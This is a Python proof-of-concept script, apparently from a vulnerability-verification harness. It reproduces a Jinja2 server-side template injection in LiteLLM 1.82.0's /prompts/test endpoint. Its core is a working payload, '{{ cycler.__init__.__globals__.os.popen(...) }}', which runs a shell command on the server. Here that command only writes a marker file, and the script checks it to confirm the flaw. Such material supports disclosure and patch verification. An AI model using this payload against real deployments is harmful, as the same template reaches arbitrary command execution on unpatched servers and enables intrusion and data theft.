"""CVE-2026-42203 dynamic reproduction (LiteLLM 1.82.0).

``PromptManager`` builds a plain Jinja2 ``Environment`` (not a sandbox) and
``/prompts/test`` renders attacker-controlled dotprompt content with it.  The
rendered prompt is expected to be inert text; this PoC proves server-side
template execution by reading the os module through Jinja globals and writing a
marker.  The handler continues and returns a model error afterwards, so the
marker is the proof, not the HTTP status.
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import poclib  # noqa: E402


def main() -> None:
    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    master = "sk-trident-upstream-verify"
    os.environ["LITELLM_MASTER_KEY"] = master
    os.environ.setdefault("LITELLM_LOCAL_MODEL_COST_MAP", "True")

    import litellm.proxy.proxy_server as proxy
    from fastapi.testclient import TestClient

    proxy.master_key = master
    text = poclib.MARKER_TEXT
    marker = str(poclib.MARKER_FILE).replace("\\", "\\\\")
    poclib.start_marker("ABSENT")

    template = (
        "---\nmodel: gpt-4o\n---\nUser: "
        "{{ cycler.__init__.__globals__.os.popen('echo " + text + " > \"" + marker + "\"').read() }}"
    )
    client = TestClient(proxy.app)
    response = client.post(
        "/prompts/test",
        headers={"Authorization": f"Bearer {master}"},
        json={"dotprompt_content": template, "prompt_variables": {}},
    )
    body = response.text[:2000]

    if not poclib.marker_ok():
        poclib.fail("Jinja prompt injection did not execute", http_status=response.status_code, response=body)

    poclib.finish_verified(
        {
            "request_response": [
                {
                    "method": "POST",
                    "route": "/prompts/test",
                    "auth": "LITELLM_MASTER_KEY",
                    "http_status": response.status_code,
                    "response": body,
                    "payload": "{{ cycler.__init__.__globals__.os.popen(...) }}",
                    "note": "handler returns a model routing error after rendering; marker is written during render",
                }
            ],
            "transport": {
                "type": "http+asgi-testclient",
                "package": manifest.get("version_ref", {}).get("package"),
                "version": manifest.get("version"),
                "python": sys.version.split()[0],
            },
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text",
        }
    )


if __name__ == "__main__":
    main()
